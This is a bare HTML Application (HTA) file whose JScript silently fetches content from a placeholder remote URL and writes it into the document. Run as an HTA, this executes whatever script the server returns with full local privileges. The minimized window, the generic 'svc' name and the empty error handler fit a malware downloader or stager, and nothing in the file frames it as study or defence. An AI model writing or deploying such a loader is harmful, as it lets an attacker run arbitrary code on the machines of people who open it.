<html>
<head>
<HTA:APPLICATION ID="svc" APPLICATIONNAME="svc" SHOWINTASKBAR="yes" SINGLEINSTANCE="yes" WINDOWSTATE="minimize" />
<script language="JScript">
    var endpoint = "https://example.invalid/static/view";
    try {
        var transport = new ActiveXObject("Microsoft.XMLHTTP");
        transport.open("GET", endpoint, false);
        transport.send();
        document.writeln(transport.responseText);
    } catch (err) {}
</script>
</head>
<body></body>
</html>
